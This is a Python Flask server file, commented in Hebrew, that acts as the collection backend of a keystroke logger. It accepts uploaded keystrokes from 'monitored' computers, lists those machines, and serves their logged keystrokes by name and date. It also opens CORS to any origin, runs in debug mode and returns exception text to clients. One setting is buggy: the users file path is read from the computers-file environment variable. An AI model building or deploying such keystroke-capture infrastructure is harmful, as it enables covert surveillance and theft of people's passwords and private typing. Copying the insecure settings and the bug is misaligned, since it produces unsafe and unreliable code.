from flask import Flask, jsonify
from request_functions import RequestFunctions
from flask_cors import CORS
from dotenv import load_dotenv
import os


app = Flask(__name__)
CORS(app)

load_dotenv()
DECRYPTION_KEY = os.getenv('DECRYPTION_KEY')
BASE_DIR = os.getenv("DATA_DIR", "data")
COMPUTERS_FILE = os.getenv("COMPUTERS_FILE", 'computers_names.json')
USERS_FILE = os.getenv("COMPUTERS_FILE", 'users_data.json')

# יצירת מופע למחלקת העזר עם שליחת הפרמטרים הנדרשים
request_handler = RequestFunctions(BASE_DIR, DECRYPTION_KEY, COMPUTERS_FILE, USERS_FILE)

# בקשות POST
@app.route('/api/upload', methods=['POST'])
def upload():
    """העלאת ההקשות שנאספו מהמחשב שבמעקב"""
    try:
        response = request_handler.upload()
        if 'Error' in response:
            return jsonify(response), 400
        return jsonify(response), 200
    except Exception as e:
        return jsonify({'Error': str(e)}), 500

@app.route('/api/login', methods=['post'])
def login():
    """בדיקת תקינות שם וסיסמה של משתמש לצורך כניסתו"""
    try:
        response = request_handler.login()
        if 'Error' in response:
            return jsonify(response), 400
        if 'Failed' in response:
            return jsonify(response), 401
        return jsonify(response), 200
    except Exception as e:
        return jsonify({'Error': str(e)}), 500

# בקשות GET
@app.route('/api/get_machines_names', methods=['GET'])
def get_machines_names():
    """קבלת רשימת שמות המחשבים שבמעקב"""
    try:
        response = request_handler.get_machines_names()
        if 'Error' in response:
            return jsonify(response), 400
        return jsonify(response), 200
    except Exception as e:
        return jsonify({'Error': str(e)}), 500

@app.route('/api/get_dates_by_name/<name>', methods=['GET'])
def get_dates_by_name(name):
    """קבלת רשימת התאריכים שנאספו עד כה על מחשב ספציפי"""
    try:
        response = request_handler.get_dates_by_name(name)
        if 'Error' in response:
            return jsonify(response), 400
        return jsonify(response), 200
    except Exception as e:
        return jsonify({'Error': str(e)}), 500

@app.route('/api/get_keystrokes_by_name_and_date/<name>/<date>', methods=['GET'])
def get_keystrokes_by_name_and_date(name, date):
    """קבלת מידע ההקשות ממחשב מסוים ביום מסוים"""
    try:
        response = request_handler.get_keystrokes_by_name_and_date(name, date)
        if 'Error' in response:
            return jsonify(response), 400
        return jsonify(response), 200
    except Exception as e:
        return jsonify({'Error': str(e)}), 500


if __name__ == '__main__':
    app.run(debug=True)
